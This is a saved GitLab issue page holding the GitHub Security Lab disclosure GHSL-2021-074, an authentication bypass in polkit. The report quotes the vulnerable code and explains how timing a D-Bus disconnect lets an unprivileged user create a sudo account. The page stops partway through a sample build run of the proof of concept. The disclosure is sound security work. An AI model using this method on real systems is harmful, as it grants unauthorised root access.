<div data-testid="breadcrumb-links" id="js-vue-page-breadcrumbs-wrapper">
<div data-breadcrumbs-json="[{&quot;text&quot;:&quot;polkit&quot;,&quot;href&quot;:&quot;/polkit&quot;,&quot;avatarPath&quot;:null},{&quot;text&quot;:&quot;polkit&quot;,&quot;href&quot;:&quot;/polkit/polkit&quot;,&quot;avatarPath&quot;:null},{&quot;text&quot;:&quot;Issues&quot;,&quot;href&quot;:&quot;/polkit/polkit/-/issues&quot;,&quot;avatarPath&quot;:null},{&quot;text&quot;:&quot;#140&quot;,&quot;href&quot;:&quot;/polkit/polkit/-/issues/140&quot;,&quot;avatarPath&quot;:null}]" id="js-vue-page-breadcrumbs"></div>
<div id="js-injected-page-breadcrumbs"></div>
</div>


</div>
<div class="gl-flex-none gl-flex gl-items-center gl-justify-center">
<div id="js-advanced-search-modal"></div>

</div>
<div class="gl-grow gl-basis-0 gl-flex gl-items-center gl-justify-end">
<div id="js-work-item-feedback"></div>


</div>
</div>
</div>

<div class="container-fluid container-limited limit-container-width project-highlight-puc">
<main class="content" id="content-body" itemscope itemtype="http://schema.org/SoftwareSourceCode">
<div class="flash-container flash-container-page sticky" data-testid="flash-container">
<div id="js-global-alerts"></div>
</div>







<div class="issue-details issuable-details js-issue-details">
<div class="detail-page-description content-block js-detail-page-description gl-pt-3 gl-pb-0 gl-border-none">
<div data-header-actions-data="{&quot;can_create_issue&quot;:&quot;false&quot;,&quot;can_create_incident&quot;:&quot;false&quot;,&quot;can_destroy_issue&quot;:&quot;false&quot;,&quot;can_reopen_issue&quot;:&quot;false&quot;,&quot;can_report_spam&quot;:&quot;&quot;,&quot;can_update_issue&quot;:&quot;false&quot;,&quot;is_issue_author&quot;:&quot;false&quot;,&quot;issue_path&quot;:&quot;/polkit/polkit/-/issues/140&quot;,&quot;new_issue_path&quot;:&quot;/polkit/polkit/-/issues/new?add_related_issue=140&quot;,&quot;project_path&quot;:&quot;polkit/polkit&quot;,&quot;report_abuse_path&quot;:&quot;/-/abuse_reports/add_category&quot;,&quot;reported_user_id&quot;:14586,&quot;reported_from_url&quot;:&quot;https://gitlab.freedesktop.org/polkit/polkit/-/issues/140&quot;,&quot;submit_as_spam_path&quot;:&quot;/polkit/polkit/-/issues/140/mark_as_spam&quot;,&quot;issuable_email_address&quot;:null}" data-initial="{&quot;endpoint&quot;:&quot;/polkit/polkit/-/issues/140&quot;,&quot;updateEndpoint&quot;:&quot;/polkit/polkit/-/issues/140.json&quot;,&quot;canUpdate&quot;:false,&quot;canDestroy&quot;:false,&quot;issuableRef&quot;:&quot;#140&quot;,&quot;imported&quot;:false,&quot;markdownPreviewPath&quot;:&quot;/polkit/polkit/-/preview_markdown?target_id=140\u0026target_type=Issue&quot;,&quot;markdownDocsPath&quot;:&quot;/help/user/markdown.md&quot;,&quot;lockVersion&quot;:1,&quot;issuableTemplateNamesPath&quot;:&quot;/polkit/polkit/description_templates/names/issue&quot;,&quot;initialTitleHtml&quot;:&quot;GHSL-2021-074: authentication bypass vulnerability in polkit&quot;,&quot;initialTitleText&quot;:&quot;GHSL-2021-074: authentication bypass vulnerability in polkit&quot;,&quot;initialDescriptionHtml&quot;:&quot;\u003ch1 data-sourcepos=\&quot;1:1-1:66\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-github-security-lab-ghsl-vulnerability-report-ghsl-2021-074\&quot; class=\&quot;anchor\&quot; href=\&quot;#github-security-lab-ghsl-vulnerability-report-ghsl-2021-074\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eGitHub Security Lab (GHSL) Vulnerability Report: \u003ccode data-sourcepos=\&quot;1:53-1:65\&quot;\u003eGHSL-2021-074\u003c/code\u003e\u0026#x000A;\u003c/h1\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;3:1-3:171\&quot; dir=\&quot;auto\&quot;\u003eThe \u003ca data-sourcepos=\&quot;3:5-3:57\&quot; href=\&quot;https://securitylab.github.com\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003eGitHub Security Lab\u003c/a\u003e team has identified potential security vulnerabilities in \u003ca data-sourcepos=\&quot;3:117-3:170\&quot; href=\&quot;https://gitlab.freedesktop.org/polkit/polkit\&quot;\u003epolkit\u003c/a\u003e.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;5:1-5:190\&quot; dir=\&quot;auto\&quot;\u003eWe are committed to working with you to help resolve these issues. In this report you will find everything you need to effectively coordinate a resolution of these issues with the GHSL team.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;7:1-7:185\&quot; dir=\&quot;auto\&quot;\u003eIf at any point you have concerns or questions about this process, please do not hesitate to reach out to us at \u003ccode data-sourcepos=\&quot;7:114-7:135\&quot;\u003esecuritylab@github.com\u003c/code\u003e (please include \u003ccode data-sourcepos=\&quot;7:155-7:167\&quot;\u003eGHSL-2021-074\u003c/code\u003e as a reference).\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;9:1-9:82\&quot; dir=\&quot;auto\&quot;\u003eIf you are \u003cem data-sourcepos=\&quot;9:12-9:16\&quot;\u003eNOT\u003c/em\u003e the correct point of contact for this report, please let us know!\u003c/p\u003e\u0026#x000A;\u003ch2 data-sourcepos=\&quot;11:1-11:10\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-summary\&quot; class=\&quot;anchor\&quot; href=\&quot;#summary\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eSummary\u003c/h2\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;13:1-13:158\&quot; dir=\&quot;auto\&quot;\u003eThere is an authentication bypass vulnerability in polkit, which enables an unprivileged user to get authorization from polkit to perform a privileged action.\u003c/p\u003e\u0026#x000A;\u003ch2 data-sourcepos=\&quot;15:1-15:10\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-product\&quot; class=\&quot;anchor\&quot; href=\&quot;#product\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eProduct\u003c/h2\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;17:1-17:54\&quot; dir=\&quot;auto\&quot;\u003e\u003ca data-sourcepos=\&quot;17:1-17:54\&quot; href=\&quot;https://gitlab.freedesktop.org/polkit/polkit\&quot;\u003epolkit\u003c/a\u003e\u003c/p\u003e\u0026#x000A;\u003ch2 data-sourcepos=\&quot;19:1-19:18\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-tested-versions\&quot; class=\&quot;anchor\&quot; href=\&quot;#tested-versions\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eTested Versions\u003c/h2\u003e\u0026#x000A;\u003cul data-sourcepos=\&quot;21:1-24:0\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;21:1-21:61\&quot;\u003epolicykit-1, 0.105-26ubuntu1 (tested on Ubuntu 20.04.2 LTS)\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;22:1-22:48\&quot;\u003epolicykit-1, 0.105-30 (tested on Ubuntu 21.04)\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;23:1-24:0\&quot;\u003epolkit, 0.116-7 (tested on Fedora 32)\u003c/li\u003e\u0026#x000A;\u003c/ul\u003e\u0026#x000A;\u003ch2 data-sourcepos=\&quot;25:1-25:10\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-details\&quot; class=\&quot;anchor\&quot; href=\&quot;#details\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eDetails\u003c/h2\u003e\u0026#x000A;\u003ch3 data-sourcepos=\&quot;27:1-27:62\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-issue-1-authentication-bypass-in-polkit-ghsl-2021-074\&quot; class=\&quot;anchor\&quot; href=\&quot;#issue-1-authentication-bypass-in-polkit-ghsl-2021-074\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eIssue 1: Authentication bypass in polkit (\u003ccode data-sourcepos=\&quot;27:48-27:60\&quot;\u003eGHSL-2021-074\u003c/code\u003e)\u003c/h3\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;29:1-29:508\&quot; dir=\&quot;auto\&quot;\u003eThe function \u003ca data-sourcepos=\&quot;29:14-29:151\&quot; href=\&quot;https://gitlab.freedesktop.org/polkit/polkit/-/blob/0.116/src/polkit/polkitsystembusname.c#L388\&quot;\u003e\u003ccode data-sourcepos=\&quot;29:16-29:52\&quot;\u003epolkit_system_bus_name_get_creds_sync\u003c/code\u003e\u003c/a\u003e is used to get the uid and pid of the process requesting the action. It does this by sending the unique bus name of the requesting process, which is typically something like \&quot;:1.96\&quot;, to \u003ccode data-sourcepos=\&quot;29:340-29:350\&quot;\u003edbus-daemon\u003c/code\u003e. These unique names are assigned and managed by \u003ccode data-sourcepos=\&quot;29:402-29:412\&quot;\u003edbus-daemon\u003c/code\u003e and cannot be forged, so this is a good way to check the privileges of the requesting process.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;31:1-31:951\&quot; dir=\&quot;auto\&quot;\u003eThe vulnerability happens when the requesting process disconnects from \u003ccode data-sourcepos=\&quot;31:73-31:83\&quot;\u003edbus-daemon\u003c/code\u003e just before the call to \u003ccode data-sourcepos=\&quot;31:111-31:147\&quot;\u003epolkit_system_bus_name_get_creds_sync\u003c/code\u003e starts. In this scenario, the unique bus name is no longer valid, so \u003ccode data-sourcepos=\&quot;31:220-31:230\&quot;\u003edbus-daemon\u003c/code\u003e sends back an error reply. This error case is handled in \u003ccode data-sourcepos=\&quot;31:291-31:327\&quot;\u003epolkit_system_bus_name_get_creds_sync\u003c/code\u003e by setting the value of the \u003ccode data-sourcepos=\&quot;31:359-31:363\&quot;\u003eerror\u003c/code\u003e parameter, but it still returns \u003ccode data-sourcepos=\&quot;31:399-31:402\&quot;\u003eTRUE\u003c/code\u003e, rather than \u003ccode data-sourcepos=\&quot;31:419-31:423\&quot;\u003eFALSE\u003c/code\u003e. We are not sure whether it&#39;s a bug that the return value is TRUE when this error happens, but this behavior certainly means that all callers of \u003ccode data-sourcepos=\&quot;31:572-31:608\&quot;\u003epolkit_system_bus_name_get_creds_sync\u003c/code\u003e need to carefully check whether an error was set. If the calling function forgets to check for errors then it will think that the uid of the requesting process is 0 (because the \u003ccode data-sourcepos=\&quot;31:790-31:813\&quot;\u003eAsyncGetBusNameCredsData\u003c/code\u003e struct is zero initialized). In other words, it will think that the action was requested by a root process, and will therefore allow it.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;33:1-33:194\&quot; dir=\&quot;auto\&quot;\u003eMost of the callers of \u003ccode data-sourcepos=\&quot;33:25-33:61\&quot;\u003epolkit_system_bus_name_get_creds_sync\u003c/code\u003e check the error value correctly, and are therefore not vulnerable. But the error value is not checked in the following stack trace:\u003c/p\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;35:1-44:3\&quot; class=\&quot;code highlight js-syntax-highlight language-plaintext\&quot; lang=\&quot;plaintext\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003e0  in polkit_system_bus_name_get_creds_sync of polkitsystembusname.c:393\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC2\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003e1  in polkit_system_bus_name_get_user_sync of polkitsystembusname.c:511\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC3\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003e2  in polkit_backend_session_monitor_get_user_for_subject of polkitbackendsessionmonitor-systemd.c:303\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC4\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003e3  in check_authorization_sync of polkitbackendinteractiveauthority.c:1113\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC5\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003e4  in check_authorization_sync of polkitbackendinteractiveauthority.c:1223\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC6\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003e5  in polkit_backend_interactive_authority_check_authorization of polkitbackendinteractiveauthority.c:971\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC7\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003e6  in server_handle_check_authorization of polkitbackendauthority.c:795\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC8\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003e7  in server_handle_method_call of polkitbackendauthority.c:1274\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;46:1-46:186\&quot; dir=\&quot;auto\&quot;\u003eThe bug is in this snippet of code in \u003ca data-sourcepos=\&quot;46:39-46:185\&quot; href=\&quot;https://gitlab.freedesktop.org/polkit/polkit/-/blob/0.116/src/polkitbackend/polkitbackendinteractiveauthority.c#L1121\&quot;\u003e\u003ccode data-sourcepos=\&quot;46:41-46:64\&quot;\u003echeck_authorization_sync\u003c/code\u003e\u003c/a\u003e:\u003c/p\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;48:1-63:3\&quot; data-canonical-lang=\&quot;c\&quot; class=\&quot;code highlight js-syntax-highlight language-c\&quot; lang=\&quot;c\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e\u003cspan class=\&quot;cm\&quot;\u003e/* every subject has a user; this is supplied by the client, so we rely\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC2\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e\u003cspan class=\&quot;cm\&quot;\u003e * on the caller to validate its acceptability. */\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC3\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e\u003cspan class=\&quot;n\&quot;\u003euser_of_subject\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003epolkit_backend_session_monitor_get_user_for_subject\u003c/span\u003e \u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003epriv\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003esession_monitor\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC4\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e                                                                       \u003cspan class=\&quot;n\&quot;\u003esubject\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e \u003cspan class=\&quot;nb\&quot;\u003eNULL\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC5\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e                                                                       \u003cspan class=\&quot;n\&quot;\u003eerror\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e);\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC6\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e\u003cspan class=\&quot;k\&quot;\u003eif\u003c/span\u003e \u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003euser_of_subject\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e==\u003c/span\u003e \u003cspan class=\&quot;nb\&quot;\u003eNULL\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e)\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC7\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e    \u003cspan class=\&quot;k\&quot;\u003egoto\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003eout\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e;\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC8\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC9\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e\u003cspan class=\&quot;cm\&quot;\u003e/* special case: uid 0, root, is _always_ authorized for anything */\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC10\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e\u003cspan class=\&quot;k\&quot;\u003eif\u003c/span\u003e \u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003ePOLKIT_IS_UNIX_USER\u003c/span\u003e \u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003euser_of_subject\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e)\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003epolkit_unix_user_get_uid\u003c/span\u003e \u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003ePOLKIT_UNIX_USER\u003c/span\u003e \u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003euser_of_subject\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e))\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e==\u003c/span\u003e \u003cspan class=\&quot;mi\&quot;\u003e0\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e)\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC11\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e  \u003cspan class=\&quot;p\&quot;\u003e{\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC12\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e    \u003cspan class=\&quot;n\&quot;\u003eresult\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003epolkit_authorization_result_new\u003c/span\u003e \u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003eTRUE\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003eFALSE\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e \u003cspan class=\&quot;nb\&quot;\u003eNULL\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e);\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC13\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e    \u003cspan class=\&quot;k\&quot;\u003egoto\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003eout\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e;\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC14\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e  \u003cspan class=\&quot;p\&quot;\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;65:1-65:48\&quot; dir=\&quot;auto\&quot;\u003eNotice that the value of \u003ccode data-sourcepos=\&quot;65:27-65:31\&quot;\u003eerror\u003c/code\u003e is not checked.\u003c/p\u003e\u0026#x000A;\u003ch4 data-sourcepos=\&quot;67:1-67:29\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-proof-of-concept-exploit\&quot; class=\&quot;anchor\&quot; href=\&quot;#proof-of-concept-exploit\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eProof of concept exploit\u003c/h4\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;69:1-69:1096\&quot; dir=\&quot;auto\&quot;\u003eThe attached proof of concept exploit uses this vulnerability to create a new user account with \u003ccode data-sourcepos=\&quot;69:98-69:101\&quot;\u003esudo\u003c/code\u003e privileges. It does so by calling the \u003ccode data-sourcepos=\&quot;69:143-69:152\&quot;\u003eCreateUser\u003c/code\u003e method on the \u003ccode data-sourcepos=\&quot;69:170-69:193\&quot;\u003eorg.freedesktop.Accounts\u003c/code\u003e service. The \u003ccode data-sourcepos=\&quot;69:210-69:219\&quot;\u003eCreateUser\u003c/code\u003e method uses polkit to check the authorization. The basic concept of the exploit is to disconnect from \u003ccode data-sourcepos=\&quot;69:325-69:335\&quot;\u003edbus-daemon\u003c/code\u003e before polkit calls the \u003ccode data-sourcepos=\&quot;69:363-69:399\&quot;\u003epolkit_system_bus_name_get_creds_sync\u003c/code\u003e function. The slightly tricky part of the exploit is to get the timing right. As mentioned above, most of the callers of \u003ccode data-sourcepos=\&quot;69:524-69:560\&quot;\u003epolkit_system_bus_name_get_creds_sync\u003c/code\u003e check the error correctly and will deny the request. If you put a breakpoint on \u003ccode data-sourcepos=\&quot;69:644-69:680\&quot;\u003epolkit_system_bus_name_get_creds_sync\u003c/code\u003e, you will see that the vulnerable stack trace doesn&#39;t occur until the sixth time the breakpoint is hit. Therefore, the key to a working exploit is to get the timing right, so that the disconnection happens just before the sixth call to \u003ccode data-sourcepos=\&quot;69:920-69:956\&quot;\u003epolkit_system_bus_name_get_creds_sync\u003c/code\u003e. In practice though, it seems to be fairly easy to trigger the vulnerability by trying repeatedly, with a random delay inserted each time.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;71:1-71:172\&quot; dir=\&quot;auto\&quot;\u003ePlease find the source code for the proof of concept exploit attached. It&#39;s packaged as a \u003ca data-sourcepos=\&quot;71:91-71:139\&quot; href=\&quot;https://git-scm.com/docs/git-bundle\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003egit bundle\u003c/a\u003e, which you can unpack like this:\u003c/p\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;73:1-75:3\&quot; data-canonical-lang=\&quot;bash\&quot; class=\&quot;code highlight js-syntax-highlight language-shell\&quot; lang=\&quot;shell\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003egit clone \u003cspan class=\&quot;nt\&quot;\u003e-b\u003c/span\u003e main GHSL-2021-074-polkit.bundle\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;77:1-77:117\&quot; dir=\&quot;auto\&quot;\u003eAfter you have unpacked the bundle, you will find a README with further instructions on how to build and run the PoC.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;79:1-79:20\&quot; dir=\&quot;auto\&quot;\u003eHere&#39;s a sample run:\u003c/p\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;81:1-153:3\&quot; data-canonical-lang=\&quot;bash\&quot; class=\&quot;code highlight js-syntax-highlight language-shell\&quot; lang=\&quot;shell\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003ekev@constellation:~\u003cspan class=\&quot;nv\&quot;\u003e$ \u003c/span\u003egit clone \u003cspan class=\&quot;nt\&quot;\u003e-b\u003c/span\u003e main GHSL-2021-074-polkit.bundle\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC2\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eCloning into \u003cspan class=\&quot;s1\&quot;\u003e&#39;GHSL-2021-074-polkit&#39;\u003c/span\u003e...\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC3\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eReceiving objects: 100% \u003cspan class=\&quot;o\&quot;\u003e(\u003c/span\u003e8/8\u003cspan class=\&quot;o\&quot;\u003e)\u003c/span\u003e, 17.48 KiB | 17.48 MiB/s, \u003cspan class=\&quot;k\&quot;\u003edone\u003c/span\u003e\u003cspan class=\&quot;nb\&quot;\u003e.\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC4\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003ekev@constellation:~\u003cspan class=\&quot;nv\&quot;\u003e$ \u003c/span\u003e\u003cspan class=\&quot;nb\&quot;\u003ecd \u003c/span\u003eGHSL-2021-074-polkit/\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC5\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003ekev@constellation:~/GHSL-2021-074-polkit\u003cspan class=\&quot;nv\&quot;\u003e$ \u003c/span\u003egit submodule update \u003cspan class=\&quot;nt\&quot;\u003e--init\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC6\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eSubmodule \u003cspan class=\&quot;s1\&quot;\u003e&#39;DBusParse&#39;\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e(\u003c/span\u003ehttps://github.com/kevinbackhouse/DBusParse.git\u003cspan class=\&quot;o\&quot;\u003e)\u003c/span\u003e registered \u003cspan class=\&quot;k\&quot;\u003efor \u003c/span\u003epath \u003cspan class=\&quot;s1\&quot;\u003e&#39;DBusParse&#39;\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC7\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eCloning into \u003cspan class=\&quot;s1\&quot;\u003e&#39;/home/kev/GHSL-2021-074-polkit/DBusParse&#39;\u003c/span\u003e...\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC8\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eSubmodule path \u003cspan class=\&quot;s1\&quot;\u003e&#39;DBusParse&#39;\u003c/span\u003e: checked out \u003cspan class=\&quot;s1\&quot;\u003e&#39;0d28bdc3ba1c6c4e69e125aa394eddd6edb7622f&#39;\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC9\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003ekev@constellation:~/GHSL-2021-074-polkit\u003cspan class=\&quot;nv\&quot;\u003e$ \u003c/span\u003e\u003cspan class=\&quot;nb\&quot;\u003emkdir \u003c/span\u003ebuild\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC10\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003ekev@constellation:~/GHSL-2021-074-polkit\u003cspan class=\&quot;nv\&quot;\u003e$ \u003c/span\u003e\u003cspan class=\&quot;nb\&quot;\u003ecd \u003c/span\u003ebuild/\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC11\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003ekev@constellation:~/GHSL-2021-074-polkit/build\u003cspan class=\&quot;nv\&quot;\u003e$ \u003c/span\u003ecmake ..\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC12\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003cspan class=\&quot;nt\&quot;\u003e--\u003c/span\u003e The C compiler identification is GNU 9.3.0\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC13\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003cspan class=\&quot;nt\&quot;\u003e--\u003c/span\u003e The CXX compiler identification is GNU 9.3.0\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC14\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003cspan class=\&quot;nt\&quot;\u003e--\u003c/span\u003e Check \u003cspan class=\&quot;k\&quot;\u003efor \u003c/span\u003eworking C compiler: /usr/bin/cc\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC15\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003cspan class=\&quot;nt\&quot;\u003e--\u003c/span\u003e Check \u003cspan 